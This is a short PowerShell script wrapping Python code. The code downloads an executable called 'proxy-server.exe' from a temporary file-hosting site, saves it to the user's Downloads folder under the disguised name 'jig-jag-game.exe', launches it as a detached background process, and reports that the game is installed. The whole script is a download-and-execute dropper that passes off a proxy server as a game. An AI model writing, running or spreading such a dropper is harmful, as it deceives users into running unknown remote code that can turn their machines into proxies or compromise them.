# Check for Python
if (!(Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Host "Error: Python is not installed." -ForegroundColor Red
    exit
}

$pythonCode = @"
import os
import urllib.request
import subprocess
import time

# 1. Setup paths
url = "https://temp.sh/YvdvP/proxy-server.exe"  # REPLACE THIS
filename = "jig-jag-game.exe"
downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
destination = os.path.normpath(os.path.join(downloads_path, filename))

try:
    # 2. Download the file
    print(f"Downloading to {destination}...")
    urllib.request.urlretrieve(url, destination)
    
    # 3. Launch the process correctly
    # DETACHED_PROCESS (0x00000008) allows the exe to live independently
    # CREATE_NEW_CONSOLE (0x00000010) ensures it gets its own window
    DETACHED_PROCESS = 0x00000008
    
    process = subprocess.Popen(
        [destination], 
        creationflags=DETACHED_PROCESS,
        shell=False,
        close_fds=True
    )
    
    # 4. Success message
    print(f"{filename} is installed with process ID: {process.pid}")

except Exception as e:
    print(f"Error: {e}")
"@

# Run the Python code
# We use -c to execute the string clearly
python -c $pythonCode
